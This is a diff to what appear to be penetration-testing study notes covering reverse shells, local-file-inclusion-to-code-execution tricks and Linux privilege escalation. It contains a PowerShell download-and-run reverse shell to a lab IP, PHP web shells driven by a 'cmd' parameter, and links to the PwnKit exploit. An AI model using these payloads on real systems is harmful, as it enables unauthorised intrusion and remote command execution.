@@ -1235,6 +1235,10 @@ wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-
 
 powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.1.3/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.3 -Port 4444
 ```
+
+#### Reverse Shell Cheatsheet
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
 #### Crafted Payloads
 Using `msfvenom`:
 
@@ -1247,7 +1251,7 @@ You need a staged payload to connect to `nc`.
 #### LFI to RCE
 For the following examples I will be using this payload to execute system commands:
 ```
-<?php system($_GET['cmd']); >>
+<?php system($_GET['cmd']); ?>
 ```
 And this one, to receive a reverse shell:
 ```
@@ -1268,6 +1272,7 @@ https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-pa
 
 # For shell_exec to output the result you need to echo it
 <?php echo shell_exec("whoami");?>
+<?php echo shell_exec($_GET["cmd"]); exit; ?> >> xx.php&cmd=xyz
 
 # Exec() does not output the result without echo, and only output the last line. So not very useful!
 <?php echo exec("whoami");?>
@@ -2086,11 +2091,11 @@ uname -a
 - Readable/Writable Files and Directories: `find / -writable -type d 2>/dev/null`
 - Unmounted Disks: `mount` or `cat /etc/fstab` to list files mounted at boot time. `/bin/lsblk` to view all available disks.
 - Device Drivers and Kernel Modules: `lsmod`, and `/sbin/modinfo XX` to find out more about the specific module
-- Binaries that AutoElevate: Search for `SUID` files: `find / -perm -u=s -type f 2>/dev/null` (Normally, when running an executable, it inherits the permissions of the user that runs it. However, if the SUID permissions are set, the binary will run with the permissions of the file owner. This means that if a binary has the SUID bit set and the file is owned by root, any local user will be able to execute that binary with elevated privileges.)
+- Binaries that AutoElevate: Search for SUID files: `find / -perm -u=s -type f 2>/dev/null` (Normally, when running an executable, it inherits the permissions of the user that runs it. However, if the SUID permissions are set, the binary will run with the permissions of the file owner. This means that if a binary has the SUID bit set and the file is owned by root, any local user will be able to execute that binary with elevated privileges.)
     - You can check how to exploit the binary in Google/GTFOBins
     - If `/bin/cp` has SUID, can use to make a new user in `/etc/passwd` 		(https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/)
     - `ls -al /usr/bin/<BINARY> ` to check on permissions of the binary 
-    - When in doubt, can probably try `polkit` https://github.com/berdav/CVE-2021-4034
+    - When in doubt, if `pkexec` has SUID binary set, can probably use `PwnKit` (https://github.com/ly4k/PwnKit), or if you have user authentication, you can escalate
 - Check for `ssh` permissions - who can login via `ssh`: `grep -v '^#' /etc/ssh/sshd_config | uniq`
 - If managed to login, check what groups the user is a part of: 
 
